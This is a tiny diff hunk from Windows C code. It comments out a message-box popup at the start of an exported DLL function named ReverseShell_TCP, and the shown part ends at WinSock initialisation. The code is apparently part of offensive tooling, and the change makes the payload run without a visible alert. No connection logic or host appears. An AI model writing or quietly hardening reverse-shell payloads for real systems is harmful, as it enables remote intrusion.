@@ -14,7 +14,7 @@
 
 
 __declspec(dllexport) void ReverseShell_TCP(LPVOID param) {
-    MessageBoxA(0, "ReverseShell_TCP", "ReverseShell_TCP", 0);
+    // MessageBoxA(0, "ReverseShell_TCP", "ReverseShell_TCP", 0);
     
     // Initialiser la bibliothèque WinSock
     WSADATA wsaData;
